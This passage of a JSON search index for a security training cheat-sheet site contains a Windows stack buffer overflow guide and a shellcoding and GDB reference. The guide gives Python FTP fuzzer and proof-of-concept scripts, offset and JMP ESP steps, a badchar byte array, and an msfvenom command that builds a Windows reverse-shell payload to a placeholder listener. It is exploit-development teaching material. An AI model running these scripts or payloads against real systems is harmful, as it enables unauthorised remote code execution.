class=\"language-bash\">msfvenom -p windows/shell_reverse_tcp lhost=x.x.x.x lport=xxx -b \"\\x00\\x0a\\x0d\\x.......\" -a x86 --platform win -v esp -f python\n</code></pre>\n\n<h2 class=\"-one-column\" id=\"also-see\">Also see</h2>\n\n<ul>\n  <li><a href=\"https://www.helviojunior.com.br/category/it/security/criacao-de-exploits/\" target=\"_blank\">Build Exploits Exploring Buffer Overflow - Helvio Junior</a></li>\n  <li><a href=\"https://www.youtube.com/watch?v=wLi-dGphpdg&amp;t=806s\" target=\"_blank\">Video: Understanding Buffer Overflow Concept</a></li>\n  <li><a href=\"https://www.youtube.com/watch?v=oGZ01rvbfwE&amp;t=6s\" target=\"_blank\">Video: How to do a Buffer Overflow</a></li>\n</ul>",
  "intro_html": "",
  "description_html": "",
  "tags": ["Featured"],
  "updated": "2020-07-30"
},{
  "id": "bufferoverflow-windows",
  "title": "Traditional Buffer Overflow Windows",
  "url": "/bufferoverflow-windows",
  "category": "BufferOverflow",
  "keywords": ["BufferOverflow",65535,"stack","exploits","sec4us","mona","immunity","badchars","bytearray"],
  "content_html": "<h2 class=\"-three-column\" id=\"getting-started\">GETTING STARTED</h2>\n\n<h3 class=\"-intro\" id=\"introduction\">Introduction</h3>\n\n<p>This is a quick reference to getting started with Buffer Overflow.</p>\n\n<ul>\n  <li><a href=\"https://sec4us.com.br/exploit-development-p1/\" target=\"_blank\">Buffer Overflow Training</a> <em>(learn from scratch show to create your own exploit exploring Buffer Overflow Windows)</em></li>\n  <li><a href=\"https://www.linkedin.com/in/ederluis1973\" target=\"_blank\">Linkedin page</a> <em>(Eder Luis - 0xffff)</em></li>\n  <li><a href=\"https://sec4us.com.br\" target=\"_blank\">PDF Version Soon</a> <em>(https://sec4us.com.br)</em></li>\n</ul>\n\n<h3 id=\"immunity-debugger\">Immunity Debugger</h3>\n\n<p><strong>Install Immunity</strong></p>\n\n<p>download after fill the form: \n<a href=\"https://debugger.immunityinc.com/ID_register.py\"> https://debugger.immunityinc.com/ID_register.py </a></p>\n\n<h3 id=\"configure-monapy-in-immunity-debugger\">Configure Mona.py in Immunity Debugger</h3>\n\n<p><a href=\"https://raw.githubusercontent.com/corelan/mona/master/mona.py\">download https://raw.githubusercontent.com/corelan/mona/master/mona.py</a></p>\n\n<p>put mona.py inside the <strong>/pycommands</strong> immunity directory</p>\n\n<p><strong>Setting a <strong>logs&lt;/strong&gt; directory inside Immunitydebugger</strong></strong></p>\n\n<pre><code class=\"language-bash\">!mona config -set workingfolder c:\\logs\\%p\n</code></pre>\n<ul>\n  <li>it is importart that the logs directory have been created in the windows machine with immunity.</li>\n</ul>\n\n<h2 class=\"-three-column\" id=\"registers\">REGISTERS</h2>\n\n<h3 id=\"what-is-registers-\">What is Registers ?</h3>\n\n<p>Register is a small space used by CPU to store information.</p>\n\n<h3 id=\"registers---32-bits\">Registers - 32 bits</h3>\n\n<table>\n  <thead>\n    <tr>\n      <th>32 bits</th>\n      <th>16 bits</th>\n      <th>8 bits</th>\n      <th> </th>\n    </tr>\n    <tr>\n      <th> </th>\n      <th> </th>\n      <th>High</th>\n      <th>Low</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>eax</td>\n      <td>ax</td>\n      <td>ah</td>\n      <td>al</td>\n    </tr>\n    <tr>\n      <td>ecx</td>\n      <td>ax</td>\n      <td>ch</td>\n      <td>cl</td>\n    </tr>\n    <tr>\n      <td>edx</td>\n      <td>dx</td>\n      <td>dh</td>\n      <td>dl</td>\n    </tr>\n    <tr>\n      <td>ebx</td>\n      <td>bx</td>\n      <td>bh</td>\n      <td>bl</td>\n    </tr>\n    <tr>\n      <td>esp</td>\n      <td>sp</td>\n      <td> </td>\n      <td>spl</td>\n    </tr>\n    <tr>\n      <td><strong>EBP</strong></td>\n      <td>bp</td>\n      <td> </td>\n      <td>bpl</td>\n    </tr>\n    <tr>\n      <td>esi</td>\n      <td>si</td>\n      <td> </td>\n      <td>sil</td>\n    </tr>\n    <tr>\n      <td>edi</td>\n      <td>di</td>\n      <td> </td>\n      <td>dil</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"ip---instruction-pointer\">IP - Instruction Pointer</h3>\n\n<p>Points to next instruction to be executed</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>ip</code></td>\n      <td>16 bits</td>\n    </tr>\n    <tr>\n      <td><strong><code>EIP </code></strong></td>\n      <td>32 bits</td>\n    </tr>\n    <tr>\n      <td><code>rip</code></td>\n      <td>64 bits</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"sp---stack-pointer\">SP - Stack Pointer</h3>\n\n<p>Points to top of stack</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>sp</code></td>\n      <td>16 bits</td>\n    </tr>\n    <tr>\n      <td><strong><code>ESP</code></strong></td>\n      <td>32 bits</td>\n    </tr>\n    <tr>\n      <td><code>rsp</code></td>\n      <td>64 bits</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2 class=\"-two-column\" id=\"proof-of-concept-poc\">PROOF OF CONCEPT (POC)</h2>\n\n<h3 id=\"example-connection-ftp-poc-poc-testpy\">Example Connection FTP POC [poc-test.py]</h3>\n<pre><code class=\"language-python\">#!/usr/bin/python\nimport sys\nimport socket\nimport time\nfrom struct import *\n\nrhost = 'x.x.x.x'\nport = 21\n\nbuffer = \"A\" * 100\nbuffer +='\\r\\n'\ntry:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((rhost, port))\n        print s.recv(2048)\n        s.send('USER 0xffff\\r\\n')\n        print s.recv(2048)\n        s.send('PASS sec4us\\r\\n')\n        print s.recv(2048)\n        s.send('STOR ' + buffer)\n        print s.recv(2048)\n        s.close()\n        print \"Sent Buffer of %s bytes\" %len(buffer)\nexcept socket.error as error:\n        s.close()\n        print error\n</code></pre>\n\n<h3 id=\"simple-connection-ftp-poc-fuzzer-fuzzerpy\">Simple Connection FTP POC Fuzzer [fuzzer.py]</h3>\n<pre><code class=\"language-python\">#!/usr/bin/python\n\nimport socket, time\n\nremoteip=\"x.x.x.x\"\nport=21\n\nsize=100\nbuffer = \"A\" * size\nwhile True:\n\n    print \"Fuzzing with %s bytes\" % len(buffer)\n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((remoteip, port))\n    except:\n        print (\"[-] Connection error!\")\n        sys.exit(1)\n\n    print s.recv(1024)\n    print \"Sending username...\"\n    s.send('USER anonymous\\r\\n')\n    print s.recv(1024)\n    print \"Sending pass...\"\n    s.send('PASS 0xffff@sec4us.com.br\\r\\n')\n    print s.recv(1024)\n    s.send('STOR ' + buffer +'\\r\\n')\n    print s.recv(2048)\n    s.close()\n    time.sleep(1)\n    size += 100\n    buffer = \"A\" * size\n    print \"-------------------------\"\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"badchars\">BADCHARS</h2>\n\n<h3 id=\"ascii-table\">ASCII Table</h3>\n\n<table>\n  <thead>\n    <tr>\n      <th>CHAR</th>\n      <th>DEC</th>\n      <th>OCT</th>\n      <th>HEX</th>\n      <th>Linux</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>(nl)</td>\n      <td>10</td>\n      <td>0012</td>\n      <td>x0a</td>\n      <td>\\n</td>\n    </tr>\n    <tr>\n      <td>(cr)</td>\n      <td>13</td>\n      <td>0015</td>\n      <td>x0d</td>\n      <td>\\r</td>\n    </tr>\n    <tr>\n      <td>A</td>\n      <td>65</td>\n      <td>0101</td>\n      <td>x41</td>\n      <td> </td>\n    </tr>\n    <tr>\n      <td>B</td>\n      <td>66</td>\n      <td>0102</td>\n      <td>x42</td>\n      <td> </td>\n    </tr>\n    <tr>\n      <td>C</td>\n      <td>67</td>\n      <td>0103</td>\n      <td>x43</td>\n      <td> </td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"commom-badchars\">Commom Badchars</h3>\n<p>After see the ascii tables, we have 3 common badchars that are bad for the applications</p>\n\n<pre><code class=\"language-bash\">\\x00 = Null Byte o end of string\n\\x0a = New Line \\n (linux)\n\\x0d = Carriage Return  \\r (linux)\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"traditional-buffer-overflow-windows---step-by-step\">TRADITIONAL BUFFER OVERFLOW WINDOWS - STEP BY STEP</h2>\n\n<h3 id=\"1---run-fuzzer\">1 - Run Fuzzer</h3>\n<p>Run the fuzzer to discover how many bytes you get a buffer overflow</p>\n<pre><code class=\"language-bash\">./fuzzer.py\n</code></pre>\n\n<h3 id=\"2---run-poc\">2 - Run POC</h3>\n<p>Run the POC to be sure you got a buffer overflow in the stack</p>\n<pre><code class=\"language-bash\">./poc-test.py\n\n</code></pre>\n\n<h3 id=\"3---discover-eip-position-in-the-stack\">3 - Discover EIP Position in the Stack</h3>\n<p>creating a pattern with the bytes discovered by fuzzer</p>\n<pre><code class=\"language-bash\">msf-pattern_create -l xxx\n\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n</code></pre>\n<p>inserting the pattern inside the POC and get the address in the EIP Register (<strong>eipaddress</strong>)</p>\n\n<h3 id=\"4---discover-offset\">4 - Discover OFFSET</h3>\n<p>Discover How Many bytes of the Offset before EIP (yyy)</p>\n\n<p>msf-pattern_offset -q EIPaddress</p>\n\n<pre><code class=\"language-bash\">msf-pattern_offset -q 32674231\n[*] Exact match at offset 965\n</code></pre>\n<p>Example: \noffset = “A” * yyy\noffset = “A” * 965</p>\n\n<h3 id=\"5---make-a-stack-fitting\">5 - Make a Stack Fitting</h3>\n<p>it is time of building the exploit. We use in this example a space of the payload with 400 bytes in the ESP</p>\n\n<p>Example:</p>\n<pre><code class=\"language-bash\">offset = \"A\" * yyy\neip = \"BBBB\"\nesp = \"C\" * 400\nbuffer = offset + eip + esp\n</code></pre>\n<h3 id=\"6---search-jmp-esp\">6 - Search JMP ESP</h3>\n\n<p>inside immunity debugger</p>\n\n<p><strong>!mona jmp -r esp -n</strong>\nchoose a DLL with less protection (SEH, ASLR, etc)</p>\n\n<p>Example:</p>\n<pre><code class=\"language-bash\">offset = \"A\" * yyy\neip = jmpesp-address\nesp = \"C\" * 400\nbuffer = offset + eip + esp\n</code></pre>\n<h3 id=\"7---looking-for-badchars\">7 - Looking For BADCHARS</h3>\n\n<p>inside immunity debugger</p>\n<pre><code class=\"language-bash\">!mona bytearray\n!mona bytearray -cpb \"\\x00\\x0a\\x0d\"\n</code></pre>\n<p>put the bytearray in your POC</p>\n\n<pre><code class=\"language-python\">bytearray = (\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0b\\x0c\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\"\n\"\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\"\n\"\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\"\n\"\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\"\n\"\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\"\n\"\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\"\n\"\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\"\n\"\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")\n</code></pre>\n<p>put your bytearray in the POC e run to get in the immunity the address of the start of the bytearray in the stack (ZZZZZZZZ)</p>\n\n<p>Inside Immunity Debugger</p>\n<pre><code class=\"language-bash\">!mona compare -f c:\\logs\\appname\\bytearray.bin -a ZZZZZZZZ\n</code></pre>\n<h3 id=\"8---build-a-payload-reverseshell\">8 - Build a Payload (reverseshell)</h3>\n\n<p>using the msfvenom to build a payload of the reverse shell</p>\n\n<pre><code class=\"language-bash\">msfvenom -p windows/shell_reverse_tcp lhost=x.x.x.x lport=xxx -b \"\\x00\\x0a\\x0d\\x.......\" -a x86 --platform win -v esp -f python\n</code></pre>\n\n<h2 class=\"-one-column\" id=\"also-see\">Also see</h2>\n\n<ul>\n  <li><a href=\"https://www.helviojunior.com.br/category/it/security/criacao-de-exploits/\" target=\"_blank\">Build Exploits Exploring Buffer Overflow - Helvio Junior</a></li>\n  <li><a href=\"https://www.youtube.com/watch?v=wLi-dGphpdg&amp;t=806s\" target=\"_blank\">Video: Understanding Buffer Overflow Concept</a></li>\n  <li><a href=\"https://www.youtube.com/watch?v=oGZ01rvbfwE&amp;t=6s\" target=\"_blank\">Video: How to do a Buffer Overflow</a></li>\n</ul>",
  "intro_html": "",
  "description_html": "",
  "tags": ["Featured"],
  "updated": "2020-07-30"
},{
  "id": "shellcoding",
  "title": "Shellcoding creation",
  "url": "/shellcoding",
  "category": "Shellcoding",
  "keywords": ["Shellcoding","Assembly","GDB","Disassemble","ObjDump","m4v3r1ck"],
  "content_html": "<h2 class=\"-three-column\" id=\"getting-started\">Getting started</h2>\n\n<h3 class=\"-intro\" id=\"introduction\">Introduction</h3>\n\n<p>This is a quick reference to getting started with Shellcoding.</p>\n\n<ul>\n  <li><a href=\"https://sec4us.com.br/shellcoding-for-exploitation-pres/\" target=\"_blank\">Shellcoding Training</a> <em>(learn from scratch show to create your own shellcode)</em></li>\n  <li><a href=\"https://www.helviojunior.com.br/\" target=\"_blank\">Author page</a> <em>(Hélvio Junior - M4v3r1ck)</em></li>\n  <li><a href=\"https://www.linkedin.com/in/helviojunior/\" target=\"_blank\">LinkedIn</a> <em>(Hélvio Junior - LinkedIn)</em></li>\n  <li><a href=\"http://s.sec4us.com.br/shellcoding_cheatseet.pdf\" target=\"_blank\">PDF Version</a> <em>(Hélvio Junior - M4v3r1ck)</em></li>\n</ul>\n\n<h3 id=\"shellcode-tester\">Shellcode Tester</h3>\n<p>Installing</p>\n<pre><code class=\"language-bash\">git clone https://github.com/helviojunior/shellcodetester.git\ncd shellcodetester/Linux\nmake\n</code></pre>\n\n<p>Assembling using shellcode tester</p>\n<pre><code class=\"language-bash\">shellcodetester arquivo.asm\n</code></pre>\n\n<p>Adding a break-point before shellcode</p>\n<pre><code class=\"language-bash\">shellcodetester arquivo.asm --break-point\n</code></pre>\n\n<p>For more information, windows version and releases see: \n<a href=\"https://github.com/helviojunior/shellcodetester.git\" target=\"_blank\">Shellcode Tester</a></p>\n\n<h2 class=\"-three-column\" id=\"gdb-commands\">GDB Commands</h2>\n\n<h3 id=\"open-an-application\">Open an application</h3>\n<pre><code class=\"language-bash\">gdb -q [path_da_aplicação]\n</code></pre>\n\n<p>Using his coredump</p>\n<pre><code class=\"language-bash\">gdb -q [path_da_aplicação] [path_core_dump]\n</code></pre>\n\n<h3 id=\"command-help\">Command help</h3>\n<pre><code class=\"language-bash\">(gdb) help [comando]\n(gdb) help run\n</code></pre>\n\n<h3 id=\"run-app-without-parameter\">Run app without parameter</h3>\n<pre><code class=\"language-bash\">(gdb) run\n</code></pre>\n\n<h3 id=\"check-permissions\">Check permissions</h3>\n<pre><code class=\"language-bash\">(gdb) checksec\n</code></pre>\n\n<h3 id=\"run-app-with-parameter\">Run app with parameter</h3>\n<p>Hard-coded parameter</p>\n<pre><code class=\"language-bash\">(gdb) run AAAAA\n</code></pre>\n\n<p>Parameter from an external command</p>\n<pre><code class=\"language-bash\">(gdb) run $(echo -n “AAAA”)\n(gdb) run $(python -c 'print \"A\" * 500 ')\n</code></pre>\n\n<p>Passing data to stdin from external command</p>\n<pre><code class=\"language-bash\">(gdb) run &lt; &lt;(echo -n “AAAA”)\n(gdb) run &lt; &lt;(python -c 'print \"A\" * 500 ')\n</code></pre>\n\n<h3 id=\"breakpoints\">Breakpoints</h3>\n<p>Adding an breakpoint</p>\n<pre><code class=\"language-bash\">(gdb) b *main\n(gdb) b *0x01020304\n</code></pre>\n\n<p>Adding conditional breakpoint</p>\n<pre><code class=\"language-bash\">(gdb) b main.c:260 if (resp_pool-&gt;first==0x4141414141414141)\n</code></pre>\n\n<p>List previous breakpoints</p>\n<pre><code class=\"language-bash\">(gdb) info breakpoints\n</code></pre>\n\n<p>Delete one</p>\n<pre><code class=\"language-bash\">(gdb) del 1  # 1 is the breakpoint id\n(gdb) del 5  # 5 is the breakpoint id\n</code></pre>\n\n<p>Delete all breakpoints</p>\n<pre><code class=\"language-bash\">(gdb) del\n</code></pre>\n\n<h3 id=\"disassemble\">Disassemble</h3>\n<p>Using function name</p>\n<pre><code class=\"language-bash\">(gdb) disassemble main\n</code></pre>\n\n<p>Using memory position</p>\n<pre><code class=\"language-bash\">(gdb) disassemble 0x000011e9\n(gdb) disassemble 0x000011e9,+100\n</code></pre>\n\n<p>Displaying opcodes</p>\n<pre><code class=\"language-bash\">(gdb) disassemble/r main\n</code></pre>\n\n<h3 id=\"displaying-registers\">Displaying registers</h3>\n<pre><code class=\"language-bash\">(gdb) info registers\n(gdb) info registers eax\n</code></pre>\n\n<h3 id=\"displaying-memory-data\">Displaying memory data</h3>\n<p>Using memory address</p>\n<pre><code class=\"language-bash\">(gdb) print 0x01020304\n</code></pre>\n<p>Using debug symbol of variable name</p>\n<pre><code class=\"language-bash\">(gdb) print &amp;nome_variavel\n</code></pre>\n\n<h3 id=\"struct\">Struct</h3>\n<p>View struct members</p>\n<pre><code class=\"language-bash\">(gdb) ptype struct [nome_da_struct]\n</code></pre>\n\n<p>View struct members and offset</p>\n<pre><code class=\"language-bash\">(gdb) ptype/o struct [nome_da_struct]\n</code></pre>\n\n<p>Parsing memory data with struct</p>\n<pre><code class=\"language-bash\">(gdb) print/x *(struct sockaddr_in *) &amp;nome_variavel\n(gdb) print/x *(struct sockaddr_in *) 0x01020304\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"assembly\">Assembly</h2>\n\n<h3 id=\"registers\">Registers</h3>\n\n<p>Register is a small space used by CPU to store information.</p>\n\n<h3 id=\"registers---32-bits\">Registers - 32 bits</h3>\n\n<table>\n  <thead>\n    <tr>\n      <th>32 bits</th>\n      <th>16 bits</th>\n      <th>8 bits</th>\n      <th> </th>\n    </tr>\n    <tr>\n      <th> </th>\n      <th> </th>\n      <th>High</th>\n      <th>Low</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>eax</td>\n      <td>ax</td>\n      <td>ah</td>\n      <td>al</td>\n    </tr>\n    <tr>\n      <td>ecx</td>\n      <td>ax</td>\n      <td>ch</td>\n      <td>cl</td>\n    </tr>\n    <tr>\n      <td>edx</td>\n      <td>dx</td>\n      <td>dh</td>\n      <td>dl</td>\n    </tr>\n    <tr>\n      <td>ebx</td>\n      <td>bx</td>\n      <td>bh</td>\n      <td>bl</td>\n    </tr>\n    <tr>\n      <td>esp</td>\n      <td>sp</td>\n      <td> </td>\n      <td>spl</td>\n    </tr>\n    <tr>\n      <td>ebp</td>\n      <td>bp</td>\n      <td> </td>\n      <td>bpl</td>\n    </tr>\n    <tr>\n      <td>esi</td>\n      <td>si</td>\n      <td> </td>\n      <td>sil</td>\n    </tr>\n    <tr>\n      <td>edi</td>\n      <td>di</td>\n      <td> </td>\n      <td>dil</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"registers---64-bits\">Registers - 64 bits</h3>\n\n<table>\n  <thead>\n    <tr>\n      <th>64 bits</th>\n      <th>32 bits</th>\n      <th>16 bits</th>\n      <th>8 bits</th>\n      <th> </th>\n    </tr>\n    <tr>\n      <th> </th>\n      <th> </th>\n      <th> </th>\n      <th>High</th>\n      <th>Low</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>eax / r0</td>\n      <td>eax / r0d</td>\n      <td>ax / r0w</td>\n      <td>ah</td>\n      <td>al / r0b</td>\n    </tr>\n    <tr>\n      <td>ecx / r1</td>\n      <td>ecx / r1d</td>\n      <td>cx / r1w</td>\n      <td>ch</td>\n      <td>cl / r1b</td>\n    </tr>\n    <tr>\n      <td>rdx / r2</td>\n      <td>edx / r2d</td>\n      <td>dx / r2w</td>\n      <td>dh</td>\n      <td>dl / r2b</td>\n    </tr>\n    <tr>\n      <td>rbx / r3</td>\n      <td>ebx / r3d</td>\n      <td>bx / r3w</td>\n      <td>bh</td>\n      <td>bl / r3b</td>\n    </tr>\n    <tr>\n      <td>rsp / r4</td>\n      <td>esp / r4d</td>\n      <td>sp / r4w</td>\n      <td> </td>\n      <td>spl / r4b</td>\n    </tr>\n    <tr>\n      <td>rbp / r5</td>\n      <td>ebp / r5d</td>\n      <td>bp / r5w</td>\n      <td> </td>\n      <td>bpl / r5b</td>\n    </tr>\n    <tr>\n      <td>rsi / r6</td>\n      <td>esi / r6d</td>\n      <td>si / r6w</td>\n      <td> </td>\n      <td>sil / r6b</td>\n    </tr>\n    <tr>\n      <td>rdi / r7</td>\n      <td>edi / r7d</td>\n      <td>di / r7w</td>\n      <td> </td>\n      <td>dil / r7b</td>\n    </tr>\n    <tr>\n      <td>r8</td>\n      <td>r8d</td>\n      <td>r8w</td>\n      <td> </td>\n      <td>r8b</td>\n    </tr>\n    <tr>\n      <td>r9</td>\n      <td>r9d</td>\n      <td>r9w</td>\n      <td> </td>\n      <td>r9b</td>\n    </tr>\n    <tr>\n      <td>r10</td>\n      <td>r10d</td>\n      <td>r10w</td>\n      <td> </td>\n      <td>r10b</td>\n    </tr>\n    <tr>\n      <td>r11</td>\n      <td>r11d</td>\n      <td>r11w</td>\n      <td> </td>\n      <td>r11b</td>\n    </tr>\n    <tr>\n      <td>r12</td>\n      <td>r12d</td>\n      <td>r12w</td>\n      <td> </td>\n      <td>r12b</td>\n    </tr>\n    <tr>\n      <td>r13</td>\n      <td>r13d</td>\n      <td>r13w</td>\n      <td> </td>\n      <td>r13b</td>\n    </tr>\n    <tr>\n      <td>r14</td>\n      <td>r14d</td>\n      <td>r14w</td>\n      <td> </td>\n      <td>r14b</td>\n    </tr>\n    <tr>\n      <td>r15</td>\n      <td>r15d</td>\n      <td>r15w</td>\n      <td> </td>\n      <td>r15b</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"ip---instruction-pointer\">IP - Instruction Pointer</h3>\n\n<p>Points to next instruction to be executed</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>ip</code></td>\n      <td>16 bits</td>\n    </tr>\n    <tr>\n      <td><code>eip</code></td>\n      <td>32 bits</td>\n    </tr>\n    <tr>\n      <td><code>rip</code></td>\n      <td>64 bits</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"sp---stack-pointer\">SP - Stack Pointer</h3>\n\n<p>Points to top of stack</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>sp</code></td>\n      <td>16 bits</td>\n    </tr>\n    <tr>\n      <td><code>esp</code></td>\n      <td>32 bits</td>\n    </tr>\n    <tr>\n      <td><code>rsp</code></td>\n      <td>64 bits</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"assembly-insctuctions\">Assembly insctuctions</h3>\n\n<p>This table shows the main ASM instructions used to create shellcode</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Instruction</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>INT3</code></td>\n      <td>Generate breakpoint trap</td>\n    </tr>\n    <tr>\n      <td><code>CALL</code></td>\n      <td>Call a procedure</td>\n    </tr>\n    <tr>\n      <td><code>CLD</code></td>\n      <td>Clear Direction Flag</td>\n    </tr>\n    <tr>\n      <td><code>DEC</code></td>\n      <td>Decrement by 1</td>\n    </tr>\n    <tr>\n      <td><code>INC</code></td>\n      <td>Increment by 1</td>\n    </tr>\n    <tr>\n      <td><code>JMP</code></td>\n      <td>Jump</td>\n    </tr>\n    <tr>\n      <td><code>LEA</code></td>\n      <td>Load Effective Address</td>\n    </tr>\n    <tr>\n      <td><code>MOV</code></td>\n      <td>Move</td>\n    </tr>\n    <tr>\n      <td><code>NOP</code></td>\n      <td>No Operation</td>\n    </tr>\n    <tr>\n      <td><code>POP</code></td>\n      <td>Pop a Value from the Stack</td>\n    </tr>\n    <tr>\n      <td><code>PUSH</code></td>\n      <td>Push Word, Doubleword or Quadword Onto the Stack</td>\n    </tr>\n    <tr>\n      <td><code>RET</code></td>\n      <td>Return from Procedure</td>\n    </tr>\n    <tr>\n      <td><code>SHL</code></td>\n      <td>Shift Left</td>\n    </tr>\n    <tr>\n      <td><code>SHR</code></td>\n      <td>Shift Right</td>\n    </tr>\n    <tr>\n      <td><code>XOR</code></td>\n      <td>Logical Exclusive OR</td>\n    </tr>\n  </tbody>\n</table>\n\n<p>See: <a href=\"https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html\" target=\"_blank\">Intel® 64 and IA-32 Architectures Software Developer Manuals</a></p>\n\n<h3 id=\"asm-code-sample-for-32-bits\">ASM Code sample for 32 bits</h3>\n<p>This sample can be used to generate: Shellcode or ELF</p>\n<pre><code class=\"language-assembly\">[BITS 32]\nglobal _start\nsection .text\n_start:\n    ; instructions\n    nop\n    nop\n</code></pre>\n\n<p>This sample can be used to generate: Windows PE</p>\n<pre><code class=\"language-assembly\">[BITS 32]\nglobal _WinMain@16\nsection .text\n_WinMain@16:\n    ; instructions\n    nop\n    nop\n</code></pre>\n\n<h3 id=\"asm-code-sample-for-64-bits\">ASM Code sample for 64 bits</h3>\n<p>This sample can be used to generate: Shellcode or ELF</p>\n<pre><code class=\"language-assembly\">[BITS 64]\nglobal _start\nsection .text\n_start:\n    ; instructions\n    nop\n    nop\n</code></pre>\n\n<p>This sample can be used to generate: Windows PE</p>\n<pre><code class=\"language-assembly\">[BITS 64]\nglobal _WinMain@16\nsection .text\n_WinMain@16:\n    ; instructions\n    nop\n    nop\n</code></pre>\n\n<h3 id=\"assembling-for-shellcoding\">Assembling for Shellcoding</h3>\n<p>Using shellcode tester</p>\n<pre><code class=\"language-bash\">shellcodetester input_file.asm\nshellcodetester input_file.asm --break-point\n</code></pre>\n\n<p>In order to assembly to Shellcode we must have only our instrunctions without ELF or PE structure.</p>\n<pre><code class=\"language-bash\">nasm input_file.asm -o output_file.o\n</code></pre>\n\n<p>Display raw data in HEX format (does not matter if it is an 32 bit or 64 bits code)</p>\n<pre><code class=\"language-bash\">cat output_file.o | msfvenom -p - -a x86 --platform win -e generic/none -f hex\n</code></pre>\n\n<p>Display raw data in Python array format (does not matter if it is an 32 bit or 64 bits code)</p>\n<pre><code class=\"language-bash\">cat output_file.o | msfvenom -p - -a x86 --platform win -e generic/none -f python\n</code></pre>\n\n<h3 id=\"assembling-for-execution\">Assembling for Execution</h3>\n<p>Linux 32 bits</p>\n<pre><code class=\"language-bash\">nasm -f elf32 input_file.asm -o output_file.o\nld -o executable_file output_file.o -m elf_i386\n</code></pre>\n\n<p>Linux 64 bits</p>\n<pre><code class=\"language-bash\">nasm -f elf64 input_file.asm -o output_file.o\nld -o executable_file output_file.o -m elf_x86_64\n</code></pre>\n\n<p>Windows 32 bits</p>\n<pre><code class=\"language-bash\">nasm -f win32 input_file.asm -o output_file.o\ngcc -o executable_file.exe output_file.o\n</code></pre>\n\n<p>Windows 64 bits</p>\n<pre><code class=\"language-bash\">nasm -f win64 input_file.asm -o output_file.o\ngcc -o executable_file.exe output_file.o\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"tricks\">Tricks</h2>\n\n<h3 id=\"reverse-text-using-python\">Reverse text using python</h3>\n<pre><code class=\"language-python\">texto = \"Treinamento 